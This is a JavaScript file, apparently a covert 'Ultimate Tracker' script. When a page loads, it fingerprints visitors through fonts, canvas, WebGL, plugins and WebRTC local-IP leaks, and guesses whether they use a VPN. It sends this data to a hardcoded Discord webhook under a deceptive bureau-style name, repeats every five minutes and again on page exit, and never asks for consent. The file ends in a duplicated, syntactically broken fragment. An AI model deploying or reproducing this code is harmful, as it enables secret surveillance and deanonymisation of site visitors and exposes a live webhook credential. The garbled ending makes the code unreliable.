// ========================
// Ultimate Tracker - Complete Fixed Version
// ========================

// WebGL2 Support Check (Previously Missing)
function checkWebGL2Support() {
    try {
        const canvas = document.createElement('canvas');
        return !!canvas.getContext('webgl2');
    } catch (e) {
        return false;
    }
}

// WebP Support Check
function checkWebPSupport() {
    const elem = document.createElement('canvas');
    if (!!(elem.getContext && elem.getContext('2d'))) {
        return elem.toDataURL('image/webp').indexOf('data:image/webp') === 0;
    }
    return false;
}

// Main Tracking Function
function initializeUltimateTracker() {
    const trackerData = {
        // Basic System Info
        browser: navigator.userAgent,
        operatingSystem: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
        vendor: navigator.vendor,

        // Screen & Window
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        windowSize: `${window.innerWidth}x${window.innerHeight}`,
        availableScreenSpace: `${window.screen.availWidth}x${window.screen.availHeight}`,
        colorDepth: window.screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        
        // Device Capabilities
        deviceMemory: navigator.deviceMemory,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceType: /Mobile|Tablet|iPad|iPhone|Android/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
        touchScreen: navigator.maxTouchPoints > 0,
        
        // Network & Connection
        onlineStatus: navigator.onLine,
        connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        networkInfo: getDetailedNetworkInfo(),
        vpnDetection: {
            timezone: checkTimezoneDiscrepancy(),
            webRTC: checkWebRTCLeaks()
        },

        // Hardware & Sensors
        battery: 'checking...',
        sensors: {
            accelerometer: typeof Accelerometer !== 'undefined',
            gyroscope: typeof Gyroscope !== 'undefined',
            magnetometer: typeof Magnetometer !== 'undefined',
            ambientLight: typeof AmbientLightSensor !== 'undefined'
        },
        
        // Media Capabilities
        mediaDevices: {
            available: 'checking...'
        },
        audioSupport: typeof AudioContext !== 'undefined',
        videoFormats: checkVideoSupport(),
        webGLRenderer: getWebGLRenderer(),
        
        // Browser Features
        cookiesEnabled: navigator.cookieEnabled,
        localStorage: checkLocalStorage(),
        sessionStorage: checkSessionStorage(),
        webWorkers: typeof Worker !== 'undefined',
        serviceWorkers: 'serviceWorker' in navigator,
        webAssembly: typeof WebAssembly !== 'undefined',
        webGL2: checkWebGL2Support(), // Now fixed
        webP: checkWebPSupport(),
        
        // User Preferences
        prefersDarkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
        prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
        doNotTrack: navigator.doNotTrack,
        
        // Advanced APIs
        bluetooth: {
            available: typeof navigator.bluetooth !== 'undefined'
        },
        usb: {
            available: typeof navigator.usb !== 'undefined'
        },
        gamepad: {
            supported: 'getGamepads' in navigator,
            connected: navigator.getGamepads ? Array.from(navigator.getGamepads()).filter(Boolean).length : 0
        },
        
        // Performance & Memory
        performance: {
            memory: window.performance.memory ? {
                jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit,
                totalJSHeapSize: window.performance.memory.totalJSHeapSize,
                usedJSHeapSize: window.performance.memory.usedJSHeapSize
            } : 'not available',
            metrics: getPerformanceMetrics()
        },
        
        // Storage
        storageQuota: {
            available: 'checking...'
        },
        
        // Additional Features
        fonts: getFontList(),
        plugins: getPluginList(),
        canvas: getCanvasFingerprint(),
        browserExtensions: checkCommonExtensions(),
        
        // Session Info
        sessionDuration: 0,
        scrollPosition: {
            x: window.scrollX,
            y: window.scrollY
        }
    };

    // Async checks
    initializeAsyncChecks(trackerData);
    initializeEventListeners(trackerData);
    
    // Send initial data to Discord
    sendToDiscordWebhook(trackerData);
    
    return trackerData;
}

// ========================
// Helper Functions (All Included)
// ========================

// Network Helpers
function getDetailedNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        return {
            downlink: connection.downlink,
            effectiveType: connection.effectiveType,
            rtt: connection.rtt,
            saveData: connection.saveData
        };
    }
    return 'not available';
}

function checkWebRTCLeaks() {
    const pc = new RTCPeerConnection();
    const ips = new Set();
    
    pc.createDataChannel('');
    pc.createOffer()
        .then(offer => pc.setLocalDescription(offer))
        .catch(err => console.log(err));

    pc.onicecandidate = (event) => {
        if (!event.candidate) return;
        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        const match = event.candidate.candidate.match(ipRegex);
        if (match) ips.add(match[1]);
    };

    return Array.from(ips);
}

function checkTimezoneDiscrepancy() {
    const browserTime = new Date();
    const systemTime = new Date(browserTime.toLocaleString('en-US', { 
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone 
    }));
    return Math.abs(browserTime - systemTime) > 1000 * 60;
}

// Media Helpers
function checkVideoSupport() {
    const video = document.createElement('video');
    return {
        mp4: video.canPlayType('video/mp4'),
        webm: video.canPlayType('video/webm'),
        ogg: video.canPlayType('video/ogg'),
        hevc: video.canPlayType('video/mp4; codecs="hevc,mp4a.40.2"')
    };
}

function getWebGLRenderer() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return 'not available';
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
}

// Storage Helpers
function checkLocalStorage() {
    try {
        localStorage.setItem('test', 'test');
        localStorage.removeItem('test');
        return true;
    } catch (e) {
        return false;
    }
}

function checkSessionStorage() {
    try {
        sessionStorage.setItem('test', 'test');
        sessionStorage.removeItem('test');
        return true;
    } catch (e) {
        return false;
    }
}

// Font/Plugin Detection
function getFontList() {
    const fonts = [];
    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const fontList = [
        'Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New',
        'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 
        'Trebuchet MS', 'Impact', 'Arial Black'
    ];

    const h = document.getElementsByTagName('body')[0];
    const s = document.createElement('span');
    s.style.fontSize = testSize;
    s.innerHTML = testString;
    const defaultWidth = {};
    const defaultHeight = {};

    for (const baseFont of baseFonts) {
        s.style.fontFamily = baseFont;
        h.appendChild(s);
        defaultWidth[baseFont] = s.offsetWidth;
        defaultHeight[baseFont] = s.offsetHeight;
        h.removeChild(s);
    }

    for (const font of fontList) {
        let detected = false;
        for (const baseFont of baseFonts) {
            s.style.fontFamily = font + ',' + baseFont;
            h.appendChild(s);
            const matched = (s.offsetWidth !== defaultWidth[baseFont] ||
                           s.offsetHeight !== defaultHeight[baseFont]);
            h.removeChild(s);
            if (matched) {
                detected = true;
                break;
            }
        }
        if (detected) fonts.push(font);
    }
    return fonts;
}

function getPluginList() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push({
            name: navigator.plugins[i].name,
            description: navigator.plugins[i].description,
            filename: navigator.plugins[i].filename
        });
    }
    return plugins;
}

// Canvas Fingerprinting
function getCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 200;
    canvas.height = 50;
    
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.textBaseline = "alphabetic";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125,1,62,20);
    ctx.fillStyle = "#069";
    ctx.fillText("Fingerprint", 2, 15);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillText("Canvas", 4, 45);
    
    return canvas.toDataURL();
}

// Performance Metrics
function getPerformanceMetrics() {
    if (!window.performance) return 'not available';
    
    const metrics = {};
    const entries = performance.getEntriesByType('navigation')[0];
    if (entries) {
        metrics.domComplete = entries.domComplete;
        metrics.domInteractive = entries.domInteractive;
        metrics.loadEventEnd = entries.loadEventEnd;
        metrics.responseEnd = entries.responseEnd;
        metrics.domainLookupTime = entries.domainLookupEnd - entries.domainLookupStart;
        metrics.connectionTime = entries.connectEnd - entries.connectStart;
        metrics.requestTime = entries.responseEnd - entries.requestStart;
        metrics.fetchTime = entries.responseEnd - entries.fetchStart;
        metrics.totalTime = entries.loadEventEnd - entries.navigationStart;
    }
    return metrics;
}

// Extension Detection
function checkCommonExtensions() {
    const extensions = {
        adBlocker: false,
        darkMode: false,
        passwordManager: false
    };
    
    const testDiv = document.createElement('div');
    testDiv.className = 'adsbox';
    document.body.appendChild(testDiv);
    extensions.adBlocker = testDiv.offsetHeight === 0;
    document.body.removeChild(testDiv);

    return extensions;
}

// Discord Webhook Integration
function sendToDiscordWebhook(data) {
    const webhookUrl = 'https://discord.com/api/webhooks/1402364477877518446/1v4i9TTbl1-3eIQhrBI_rfMNfI9FJ0QJ0g3t-C6bDKzJzjD0VXYqDvn9jFgu1fvHUptb'; 
    
    const embed = {
        title: "Ultimate Tracker Data",
        description: "Collected tracking data from visitor",
        color: 0xff0000,
        fields: [
            {
                name: "Basic Info",
                value: `**Browser:** ${data.browser}\n**OS:** ${data.operatingSystem}\n**Language:** ${data.language}\n**Timezone:** ${data.timeZone}`,
                inline: true
            },
            {
                name: "Screen & Device",
                value: `**Resolution:** ${data.screenResolution}\n**Window Size:** ${data.windowSize}\n**Device Type:** ${data.deviceType}\n**Touch Screen:** ${data.touchScreen ? 'Yes' : 'No'}`,
                inline: true
            },
            {
                name: "Network",
                value: `**Connection Type:** ${data.connectionType}\n**Online Status:** ${data.onlineStatus ? 'Online' : 'Offline'}\n**VPN Detection:** ${data.vpnDetection.timezone ? 'Possible VPN' : 'No VPN detected'}`,
                inline: true
            },
            {
                name: "Location",
                value: `**WebRTC IPs:** ${data.vpnDetection.webRTC.join(', ') || 'None'}`,
                inline: false
            },
            {
                name: "Additional Info",
                value: `**Cookies:** ${data.cookiesEnabled ? 'Enabled' : 'Disabled'}\n**Local Storage:** ${data.localStorage ? 'Enabled' : 'Disabled'}\n**Dark Mode:** ${data.prefersDarkMode ? 'Enabled' : 'Disabled'}`,
                inline: true
            }
        ],
        timestamp: new Date().toISOString(),
        footer: {
            text: `Tracker ID: ${Math.random().toString(36).substring(2, 15)}`
        }
    };

    const payload = {
        embeds: [embed],
        content: "New visitor data collected!",
        username: "Internet Technical Services Bureau",
        avatar_url: "https://i.imgur.com/8Km9tLL.png"
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (!response.ok) {
            console.error('Failed to send data to Discord webhook');
        }
    })
    .catch(error => {
        console.error('Error sending to Discord:', error);
    });
}

// Initialize the tracker
const tracker = initializeUltimateTracker();
console.log('Ultimate Tracker Initialized:', tracker);

// Update session duration every second
setInterval(() => {
    tracker.sessionDuration++;
    if (tracker.sessionDuration % 300 === 0) { // Send update every 5 minutes
        sendToDiscordWebhook(tracker);
    }
}, 1000);

// Send data when user leaves
window.addEventListener('beforeunload', () => {
    sendToDiscordWebhook({
        ...tracker,
        event: 'User leaving page',
        sessionDuration: tracker.sessionDuration
    });
});

// Track scrolling
window.addEventListener('scroll', () => {
    tracker.scrollPosition = {
        x: window.scrollX,
        y: window.scrollY
    };
});
        x: window.scrollX,
        y: window.scrollY
    };
});
